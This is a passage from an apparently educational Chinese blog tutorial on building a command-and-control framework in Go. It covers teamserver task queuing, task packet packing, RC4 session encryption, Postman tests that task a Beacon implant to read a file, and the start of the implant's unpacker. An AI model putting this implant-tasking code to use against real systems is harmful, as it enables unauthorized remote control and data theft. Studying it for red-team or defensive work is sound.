<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> TeamServer <span class="keyword">interface</span> &#123;  </span><br><span class="line">    BeaconIsExists(beaconId <span class="type">string</span>) <span class="type">bool</span>  </span><br><span class="line">    BeaconCreate(beaconId <span class="type">string</span>, beat []<span class="type">byte</span>, listenerName <span class="type">string</span>, ExternalIP <span class="type">string</span>, Async <span class="type">bool</span>) <span class="type">error</span>  </span><br><span class="line">    BeaconGetAllTasks(beaconId <span class="type">string</span>, maxDataSize <span class="type">int</span>) ([]<span class="type">byte</span>, <span class="type">error</span>)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>server/beacon.go</code> 实现BeaconGetAllTasks方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ts *TeamServer)</span></span> BeaconGetAllTasks(beaconId <span class="type">string</span>, maxDataSize <span class="type">int</span>) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">    value, ok := ts.Beacons.Get(beaconId)  </span><br><span class="line">    <span class="keyword">if</span> !ok &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;beacon type %v does not exists&quot;</span>, beaconId)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    beacon, _ := value.(*Beacon)  </span><br><span class="line">  </span><br><span class="line">    tasksCount := beacon.TasksQueue.Len()  </span><br><span class="line">    <span class="keyword">if</span> tasksCount &gt; <span class="number">0</span> &#123;  </span><br><span class="line">  </span><br><span class="line">       tasks, err := ts.TaskGetAll(beacon.Data.Id, maxDataSize)  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">return</span> <span class="literal">nil</span>, err  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       respData, err := ts.Handler.BeaconPackData(beacon.Data, tasks)  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">return</span> <span class="literal">nil</span>, err  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">return</span> respData, <span class="literal">nil</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>server/task.go</code>：TaskGetAll方法根据指定beaconId从Beacon任务队列中取出多个任务（有长度限制）</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ts *TeamServer)</span></span> TaskGetAll(beaconId <span class="type">string</span>, availableSize <span class="type">int</span>) ([]response.TaskData, <span class="type">error</span>) &#123;  </span><br><span class="line">    value, ok := ts.Beacons.Get(beaconId)  </span><br><span class="line">    <span class="keyword">if</span> !ok &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;TaskGetAll: beacon %v not found&quot;</span>, beaconId)  </span><br><span class="line">    &#125;  </span><br><span class="line">    beacon, _ := value.(*Beacon)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> tasks []response.TaskData  </span><br><span class="line">    tasksSize := <span class="number">0</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> i := <span class="type">uint</span>(<span class="number">0</span>); i &lt; beacon.TasksQueue.Len(); i++ &#123;  </span><br><span class="line">       value, ok = beacon.TasksQueue.Get(i)  </span><br><span class="line">       <span class="keyword">if</span> ok &#123;  </span><br><span class="line">          taskData := value.(response.TaskData)  </span><br><span class="line">          <span class="keyword">if</span> tasksSize+<span class="built_in">len</span>(taskData.Data) &lt; availableSize &#123;  </span><br><span class="line">             tasks = <span class="built_in">append</span>(tasks, taskData)  </span><br><span class="line">             beacon.TasksQueue.Delete(i)  </span><br><span class="line">             i--  </span><br><span class="line">             tasksSize += <span class="built_in">len</span>(taskData.Data)  </span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">             <span class="keyword">break</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">          <span class="keyword">break</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> tasks, <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon.go</code> 补充BeaconPackData方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Handler)</span></span> BeaconPackData(beaconData response.BeaconData, tasks []response.TaskData) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">    beaconHandler, ok := h.BeaconHandlers[beaconData.Name]  </span><br><span class="line">    <span class="keyword">if</span> !ok &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;beacon handler not found&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> beaconHandler.BeaconPackData(beaconData, tasks)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/types.go</code> 在BeaconHandler接口定义BeaconPackData方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> BeaconHandler <span class="keyword">interface</span> &#123;  </span><br><span class="line">    BeaconGenerate(beaconConfig request.GenerateConfig, listenerConfig request.ConfigDetail) ([]<span class="type">byte</span>, <span class="type">string</span>, <span class="type">error</span>)  </span><br><span class="line">    BeaconCreate(beat []<span class="type">byte</span>) (response.BeaconData, <span class="type">error</span>)  </span><br><span class="line">    BeaconCommand(client <span class="type">string</span>, cmdline <span class="type">string</span>, beaconData response.BeaconData, args <span class="keyword">map</span>[<span class="type">string</span>]any) <span class="type">error</span>  </span><br><span class="line">    BeaconPackData(beaconData response.BeaconData, tasks []response.TaskData) ([]<span class="type">byte</span>, <span class="type">error</span>)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/beacon_main.go</code> 实现BeaconHandler.BeaconPackData方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *BeaconHandler)</span></span> BeaconPackData(beaconData response.BeaconData, tasks []response.TaskData) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">    packedData, err := b.PackTasks(tasks)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, err  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> b.EncryptData(packedData, beaconData.SessionKey)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/beacon_handler.go</code> 补充PackTasks方法，这个方法就是打包成最后的任务包，任务的数据结构见本章开头。解释一下 <code>array = append(array, int32(4+len(taskData.Data))) </code>，4表示taskid的长度。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *BeaconHandler)</span></span> PackTasks(tasksArray []response.TaskData) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> (  </span><br><span class="line">       packData []<span class="type">byte</span>  </span><br><span class="line">       array    []<span class="keyword">interface</span>&#123;&#125;  </span><br><span class="line">       err      <span class="type">error</span>  </span><br><span class="line">    )  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> _, taskData := <span class="keyword">range</span> tasksArray &#123;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 把十六进制的任务 ID 转成 int64       </span></span><br><span class="line">       taskId, err := strconv.ParseInt(taskData.TaskId, <span class="number">16</span>, <span class="number">64</span>)  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">return</span> <span class="literal">nil</span>, err  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 一个任务包=任务包的长度（不包含长度字段，4B）+任务ID（4B）+任务数据（任务类型4B+Args）  </span></span><br><span class="line">       array = <span class="built_in">append</span>(array, <span class="type">int32</span>(<span class="number">4</span>+<span class="built_in">len</span>(taskData.Data)))  </span><br><span class="line">       array = <span class="built_in">append</span>(array, <span class="type">int32</span>(taskId))  </span><br><span class="line">       array = <span class="built_in">append</span>(array, taskData.Data)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    packData, err = PackArray(array)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, err  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> packData, <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/beacon_handler.go</code> 补充EncryptData方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *BeaconHandler)</span></span> EncryptData(data []<span class="type">byte</span>, key []<span class="type">byte</span>) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">    <span class="keyword">return</span> RC4Crypt(data, key)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/beacon_utils.go</code> 补充RC4Crypt方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RC4Crypt</span><span class="params">(data []<span class="type">byte</span>, key []<span class="type">byte</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">    rc4crypt, err := rc4.NewCipher(key)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;rc4 crypt error&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    decryptData := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(data))  </span><br><span class="line">    rc4crypt.XORKeyStream(decryptData, data)  </span><br><span class="line">    <span class="keyword">return</span> decryptData, <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-3-测试"><a href="#5-3-测试" class="headerlink" title="5.3 测试"></a>5.3 测试</h2><h3 id="5-3-1-任务创建"><a href="#5-3-1-任务创建" class="headerlink" title="5.3.1 任务创建"></a>5.3.1 任务创建</h3><p>①<strong>服务器启动</strong>：在 <code>server/task.go</code> 的TaskCreate方法下一个断点，我只想看到最后任务数据是否进入到任务队列里</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/08/01/11-30-01-53ad349aafb6898a8a0a148b9f0beb5b-20250801113001-159668.png"></p>
<p>②<strong>Beacon启动</strong></p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/08/01/11-32-31-deb15a3847c94f937a5601784d63f243-20250801113231-dd9bf7.png"></p>
<p>③<strong>创建监听器</strong></p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/08/01/11-32-59-acf371d1c1951a4ece13677ffa1ef11b-20250801113259-d6a4fe.png"></p>
<p>④<strong>创建任务</strong>：一定要Beacon完成上线才能创建任务</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;beacon_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Beacon&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;beacon_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;55667788&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cmdline&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cat C:\\Users\\BitDefender\\Desktop\\ProcessExplorer\\Eula.txt&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cat&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C:\\Users\\BitDefender\\Desktop\\ProcessExplorer\\Eula.txt&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>用postman发送创建任务的请求</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/08/01/11-35-42-a282920772f49d82597722eef2083f18-20250801113541-cf2c62.png"></p>
<p>这时会在刚刚下的断点处停下</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/08/01/11-36-33-abb504be6818107011badbcc9e7e11a6-20250801113632-86641f.png"></p>
<p>步过，看到ts对象的相应Beacon的任务队列中存放了任务数据</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/08/01/11-39-36-6277e00225517bb1c3f18b6c4a42d9fa-20250801113936-0ade9a.png"></p>
<h3 id="5-3-2-任务获取"><a href="#5-3-2-任务获取" class="headerlink" title="5.3.2 任务获取"></a>5.3.2 任务获取</h3><p>①启动服务器</p>
<p>②用postman发送创建监听器请求</p>
<p>③用postman发送创建任务的请求（beacon一定要先注册，才能下发任务）</p>
<p>④beacon调式分析</p>
<p><strong>无任务</strong>：</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/08/01/20-55-13-1062fa28a5c9b4ae55021d5ed081c53e-20250801205513-face17.png"></p>
<p><strong>错误</strong>：</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/08/01/20-57-09-f3295a3d924e9af290033a08fd062e1e-20250801205709-64ed6e.png"></p>
<p><strong>有任务</strong>：<br>0<del>3：除长度字段外任务包长度<br>4</del>7：TaskId<br>8<del>11：CommandId（或者说是CommandType）<br>12</del>n：Args，一些任务参数</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/08/02/15-20-22-c465b1a29bef79b6955cd668c8d8771d-20250802152021-3ca3da.png"></p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/08/02/15-19-56-e435a01c4d745a6154a56b7e1128c974-20250802151956-2fdc86.png"></p>
<h1 id="六、任务执行与结果回显"><a href="#六、任务执行与结果回显" class="headerlink" title="六、任务执行与结果回显"></a>六、任务执行与结果回显</h1><h2 id="6-1-任务包解读-Beacon端"><a href="#6-1-任务包解读-Beacon端" class="headerlink" title="6.1 任务包解读-Beacon端"></a>6.1 任务包解读-Beacon端</h2><p>还记得任务包长什么样子吗？这里再给出它的结构图，因为我们要根据按照服务器任务包打包顺序解读数据包的里内容。一个任务包&#x3D;任务包的长度（不包含长度字段，4B）+任务ID（4B）+任务数据（任务类型4B+Args）</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/08/02/15-13-47-c8e830742a512999766e2a657e965949-%E4%BB%BB%E5%8A%A1%E5%8C%85-0a77cd.png"></p>
<p><code>utils/packet/unpacker.go</code> 包含解包器的相关方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> packet</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Parser <span class="keyword">struct</span> &#123;</span><br><span class="line">	buffer []<span class="type">byte</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CreateParser</span><span class="params">(buffer []<span class="type">byte</span>)</span></span> *Parser &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;Parser&#123;</span><br><span class="line">		buffer: buffer,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> Size() <span class="type">uint</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="type">uint</span>(<span class="built_in">len</span>(p.buffer))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> Check(types []<span class="type">string</span>) <span class="type">bool</span> &#123;</span><br><span class="line"></span><br><span class="line">	packerSize := p.Size()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _, t := <span class="keyword">range</span> types &#123;</span><br><span class="line">		<span class="keyword">switch</span> t &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;byte&quot;</span>:</span><br><span class="line">			<span class="keyword">if</span> packerSize &lt; <span class="number">1</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">			&#125;</span><br><span class="line">			packerSize -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;int16&quot;</span>:</span><br><span class="line">			<span class="keyword">if</span> packerSize &lt; <span class="number">2</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">			&#125;</span><br><span class="line">			packerSize -= <span class="number">2</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;int32&quot;</span>:</span><br><span class="line">			<span class="keyword">if</span> packerSize &lt; <span class="number">4</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">			&#125;</span><br><span class="line">			packerSize -= <span class="number">4</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;int64&quot;</span>:</span><br><span class="line">			<span class="keyword">if</span> packerSize &lt; <span class="number">8</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">			&#125;</span><br><span class="line">			packerSize -= <span class="number">8</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;array&quot;</span>:</span><br><span class="line">			<span class="keyword">if</span> packerSize &lt; <span class="number">4</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			index := p.Size() - packerSize</span><br><span class="line">			value := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">4</span>)</span><br><span class="line">			<span class="built_in">copy</span>(value, p.buffer[index:index+<span class="number">4</span>])</span><br><span class="line">			length := <span class="type">uint</span>(binary.BigEndian.Uint32(value))</span><br><span class="line">			packerSize -= <span class="number">4</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> packerSize &lt; length &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">			&#125;</span><br><span class="line">			packerSize -= length</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> ParseInt8() <span class="type">uint8</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> value = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> p.Size() &gt;= <span class="number">1</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> p.Size() == <span class="number">1</span> &#123;</span><br><span class="line">			<span class="built_in">copy</span>(value, p.buffer[:p.Size()])</span><br><span class="line">			p.buffer = []<span class="type">byte</span>&#123;&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">copy</span>(value, p.buffer[:<span class="number">1</span>])</span><br><span class="line">			p.buffer = p.buffer[<span class="number">1</span>:]</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> value[<span class="number">0</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> ParseInt16() <span class="type">uint16</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> value = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> p.Size() &gt;= <span class="number">2</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> p.Size() == <span class="number">2</span> &#123;</span><br><span class="line">			<span class="built_in">copy</span>(value, p.buffer[:p.Size()])</span><br><span class="line">			p.buffer = []<span class="type">byte</span>&#123;&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">copy</span>(value, p.buffer[:<span class="number">2</span>])</span><br><span class="line">			p.buffer = p.buffer[<span class="number">2</span>:]</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> binary.BigEndian.Uint16(value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> ParseInt32() <span class="type">uint</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> value = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> p.Size() &gt;= <span class="number">4</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> p.Size() == <span class="number">4</span> &#123;</span><br><span class="line">			<span class="built_in">copy</span>(value, p.buffer[:p.Size()])</span><br><span class="line">			